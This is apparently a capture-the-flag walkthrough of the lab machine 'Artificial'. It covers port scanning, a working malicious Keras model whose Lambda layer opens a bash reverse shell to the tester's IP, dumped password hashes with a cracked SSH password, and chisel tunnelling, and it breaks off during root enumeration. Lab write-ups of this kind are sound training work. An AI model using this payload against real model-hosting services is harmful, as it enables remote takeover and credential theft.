---
hidden: true
---

# Artificial

## Machine Info





## Port Scanning

```bash
nmap -T4 -A -p- --min-rate 1000 --open -oN port_scan.txt 10.10.11.74

Nmap scan report for 10.10.11.74
Host is up (0.037s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 (RSA)
|   256 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c (ECDSA)
|_  256 e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://artificial.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
```



## Web Enumeration

Change the /etc/hosts file to allow the visualization of the web page.

```bash
sudo nano /etc/hosts

10.10.11.74     artificial.htb
```

Registering to the website we'll moving to upload file page login.

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

### Tensorflow-cpu 2.13.1 RCE vulnerability

If we read the requirements document, it indicate that for create the model we have to use `tensorflow-cpu==2.13.1` .&#x20;

Searching online we have a PoC of Code Injection vulnerability in this version of Tensorflow.

{% embed url="https://github.com/tensorflow/tensorflow/issues/82214" %}

Now which we are in, craft the payload with Github code and add a simple reverse shell.

{% code title="craft_payload.py" %}
```python
import tensorflow as tf

def exploit(x):
  import os
  os.system("bash -c 'bash -i >& /dev/tcp/10.10.14.109/9009 0>&1'")
  return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile(optimizer='adam', loss='mse')
model.save("model.h5")
```
{% endcode %}

Try to build a docker environment provide by the website:

```bash
sudo docker build -t dev_env .
sudo docker run -it --rm -v $(pwd):/code dev_env
```

Then, run the script inside a docker environment

```bash
python3 craft_payload.py
```

This script will create `model.h5` file, that is the model with the payload inside.

THEN THE PAYLOAD WAS CREATE, start a listener

```bash
penelope
listeners add 10.10.14.109 9009
```

Now upload the model on website and press "View Predictions" to execute it by the server.

<figure><img src="../../../.gitbook/assets/image (278).png" alt=""><figcaption></figcaption></figure>

And we have shell

<figure><img src="../../../.gitbook/assets/image (279).png" alt=""><figcaption></figcaption></figure>



## Privilege Escalation to User

```bash
cp /usr/share/peass/linpeas/linpeas.sh . 

./linpeas.sh
```



### Juicy file

```bash
sqlite3 users.db

SELECT * FROM user;

#output
1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8
2|mark|mark@artificial.htb|0f3d8c76530022670f1c6029eed09ccb
3|robert|robert@artificial.htb|b606c5f5136170f15444251665638b36
4|royer|royer@artificial.htb|bc25b1f80f544c0ab451c02a3dca9fc6
5|mary|mary@artificial.htb|bf041041e57f1aff3be7ea1abd6129d0

```



<figure><img src="../../../.gitbook/assets/image (280).png" alt=""><figcaption></figcaption></figure>

### User.flag

Now with the password, we can gain access vie SSH with gael user

```bash
ssh gael@10.10.11.74
> mattp005numbertwo
```

Print the user flag

```bash
cat user.txt
```

## Privilege Escalation to Root



### Port Forwarding without SSH password

```bash
# attacker machine
# start the chisel server
apt install chisel
chisel server --port 8000 -reverse

# get chisel for linux client
wget https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_386.gz
gzip -d chisel_1.10.1_linux_386.gz
python3 -m http.server 8080

# attacker machine
wget http://10.10.14.109:8880/chisel_1.10.1_linux_386
chmod +x chisel_1.10.1_linux_386
./chmod +x chisel_1.10.1_linux_386 
./chisel_1.10.1_linux_386 client 10.10.14.109:8000 R:8989:127.0.0.1:8989


```





```
sqlite3 /home/app/app/instance/users.db

cd /etc/lvm/backup

/opt/backrest/backrest
/opt/backrest/install.sh

/usr/share/openssh/sshd_config 
```

SUID

```
-rwsr-xr-x 1 root root 87K Feb  6  2024 /usr/bin/gpasswd                                                            
-rwsr-xr-x 1 root root 84K Feb  6  2024 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 44K Feb  6  2024 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 39K Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 52K Feb  6  2024 /usr/bin/chsh
-rwsr-xr-x 1 root root 55K Apr  9  2024 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                                                                                             
-rwsr-xr-x 1 root root 163K Apr  4  2023 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 67K Apr  9  2024 /usr/bin/su
-rwsr-xr-x 1 root root 67K Feb  6  2024 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                                  
-rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 39K Apr  9  2024 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-- 1 root messagebus 51K Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 23K Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 467K Apr 11 12:16 /usr/lib/openssh/ssh-keysign

```

Local hosted port

```
tcp       50      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      814/python3                         
tcp        0      0 127.0.0.1:9898          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -   
```
